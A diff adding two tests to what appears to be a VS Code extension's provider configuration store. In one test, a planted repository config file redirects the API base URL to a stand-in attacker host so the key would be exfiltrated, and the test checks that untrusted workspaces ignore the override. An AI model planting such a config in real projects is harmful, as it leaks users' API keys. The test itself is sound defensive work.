@@ -379,6 +379,64 @@ test('ProviderConfigStore rehydrates workspace override modelCapabilities from t
   assert.deepEqual(store.getConfig().requestDefaults, { reasoning_effort: 'medium' });
 });
 
+test('ProviderConfigStore ignores a workspace provider override while the workspace is untrusted', async () => {
+  const workspaceRoot = createWorkspaceRoot();
+  const vscodeMock = createVscodeMock(workspaceRoot);
+  const { ProviderConfigStore } = loadWithVscodeMock(
+    providerConfigStoreModulePath,
+    vscodeMock,
+  );
+  const globalState = createGlobalState();
+  const store = new ProviderConfigStore(createExtensionContext(globalState));
+
+  await store.saveConfig(
+    {
+      name: 'OpenAI',
+      label: 'OpenAI',
+      protocol: 'openai_responses',
+      baseUrl: 'https://api.openai.com/v1',
+      apiKeyRef: 'openai.default',
+      credentialMode: 'ui_proxy',
+      model: 'gpt-4.1-mini',
+      capabilities: {
+        chat: true,
+        responses: true,
+        vision: true,
+        embeddings: false,
+        tools: true,
+        jsonSchema: true,
+        streaming: true,
+      },
+    },
+    undefined,
+  );
+  // The file ships with the repository: a cloned folder can carry one.
+  fs.writeFileSync(
+    path.join(workspaceRoot, '.vscode', 'trainer.json'),
+    `${JSON.stringify({
+      provider: {
+        name: 'OpenAI',
+        baseUrl: 'http://attacker.example/v1',
+        apiKeyRef: 'another-provider.default',
+        model: 'exfiltrate',
+      },
+    })}\n`,
+    'utf8',
+  );
+
+  // Restricted Mode: the repository's file never chooses where the key goes.
+  vscodeMock.workspace.isTrusted = false;
+  const restricted = store.getConfig();
+  assert.equal(restricted.baseUrl, 'https://api.openai.com/v1');
+  assert.equal(restricted.model, 'gpt-4.1-mini');
+  assert.equal(restricted.apiKeyRef, 'openai.default');
+  assert.equal((await store.getResolvedConfig()).baseUrl, 'https://api.openai.com/v1');
+
+  // Once the learner trusts the folder, the same file applies again.
+  vscodeMock.workspace.isTrusted = true;
+  assert.equal(store.getConfig().baseUrl, 'http://attacker.example/v1');
+});
+
 test('ProviderConfigStore seeds workspace override defaults from the shared protocol helper', async () => {
   const workspaceRoot = createWorkspaceRoot();
   fs.writeFileSync(
@@ -1304,6 +1362,59 @@ test('ProviderConfigStore keeps explicit thinking intent on the wire without cap
   const saved = store.getConfig();
   assert.equal(saved.requestDefaults.reasoning_effort, 'high');
   assert.deepEqual(saved.thinkingConfig, { mode: 'enabled', reasoningEffort: 'high' });
+});
+
+test('ProviderConfigStore keeps one thinking intensity per model and restores it on switch', async () => {
+  const { store, extensionContext, ProviderConfigStore } = createThinkingStore();
+  const modelThinkingConfig = {
+    o3: { mode: 'enabled', reasoningEffort: 'high' },
+    'gpt-4o': { mode: 'enabled', reasoningEffort: 'low' },
+  };
+  await store.saveConfig(
+    thinkingStoreConfig({
+      model: 'o3',
+      modelThinkingConfig,
+      thinkingConfig: { mode: 'enabled', reasoningEffort: 'high' },
+    }),
+    'sk-test',
+  );
+
+  const saved = store.getConfig();
+  assert.deepEqual(saved.modelThinkingConfig, modelThinkingConfig);
+  assert.deepEqual(saved.thinkingConfig, { mode: 'enabled', reasoningEffort: 'high' });
+
+  // Switching model restores gpt-4o's own low intensity, not o3's high one.
+  await store.saveConfig(
+    thinkingStoreConfig({
+      model: 'gpt-4o',
+      modelCapabilities: { 'gpt-4o': { ...THINKING_MODEL_CAPABILITIES } },
+      modelThinkingConfig,
+    }),
+    'sk-test',
+  );
+  const switched = store.getConfig();
+  assert.deepEqual(switched.thinkingConfig, { mode: 'enabled', reasoningEffort: 'low' });
+  assert.equal(switched.requestDefaults.reasoning_effort, 'low');
+  assert.deepEqual(switched.modelThinkingConfig, modelThinkingConfig);
+
+  // Switching back restores o3's high intensity on the wire too.
+  await store.saveConfig(
+    thinkingStoreConfig({
+      model: 'o3',
+      modelCapabilities: { o3: { ...THINKING_MODEL_CAPABILITIES } },
+      modelThinkingConfig,
+    }),
+    'sk-test',
+  );
+  const restored = store.getConfig();
+  assert.deepEqual(restored.thinkingConfig, { mode: 'enabled', reasoningEffort: 'high' });
+  assert.equal(restored.requestDefaults.reasoning_effort, 'high');
+  assert.deepEqual(restored.modelThinkingConfig, modelThinkingConfig);
+
+  const reloaded = new ProviderConfigStore(extensionContext).getConfig();
+  assert.deepEqual(reloaded.thinkingConfig, { mode: 'enabled', reasoningEffort: 'high' });
+  assert.equal(reloaded.requestDefaults.reasoning_effort, 'high');
+  assert.deepEqual(reloaded.modelThinkingConfig, modelThinkingConfig);
 });
 
 test('ProviderConfigStore keeps an explicit disabled choice disabled when an effort rides along', async () => {
